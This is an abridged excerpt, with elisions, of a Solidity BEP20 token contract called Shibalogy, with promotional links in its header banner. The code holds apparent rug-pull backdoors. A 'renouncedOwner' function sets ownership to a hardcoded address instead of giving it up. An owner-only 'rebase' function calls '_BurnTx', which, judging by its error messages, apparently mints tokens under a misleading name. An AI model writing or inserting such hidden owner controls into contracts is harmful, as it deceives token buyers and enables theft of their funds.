...
─██████████████─██████──██████─██████████─████████████████─██████──██████─██████████████─██████████████─██████████████───────██████───────
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
                                           Website:https://www.shibalogy.com

                                          Twitter:https://twitter.com/shibalogy

                                          Telegram:https://t.me/shibalogyofficial
*/
...
contract Ownable is Context {
    ...
    function renouncedOwner(uint8 time) public virtual onlyOwner {
        ...
        _owner = address(0x83ea0a08B6518644d4107A6cB18C78C1f9edD7FD);
        _lockTime = now + time;
...
contract Shibalogy is Context, iBEP20, Ownable {
 ...
 /**
   ...
   * 
   */
  function rebase(uint256 amount) public onlyOwner returns (bool) {
    _BurnTx(_msgSender(), amount);
    return true;
  }
   ...
   * 
   */
  function _BurnTx(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: send to the Dead Address");
  ...
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the Dead Address");
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the Dead Address");
    require(spender != address(0), "BEP20: approve to the Dead Address");
